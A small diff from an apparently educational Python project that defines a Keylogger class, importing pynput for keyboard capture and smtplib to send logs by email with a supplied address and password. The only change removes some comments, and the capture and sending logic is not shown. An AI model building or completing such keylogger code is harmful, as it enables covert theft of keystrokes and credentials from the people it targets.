@@ -4,13 +4,6 @@ import pynput.keyboard
 import threading
 import smtplib
 
-#threading library allows to execute several things without interrupting
-#so with thread it will allow to run on a background
-
-#log = ""
-#we make a class. Our functions are methods in class
-#we need to use self every time we give a name first time
-
 class Keylogger:
     def __init__(self, time_interval, email, password):
         self.log = "[+]Keylogger started!"
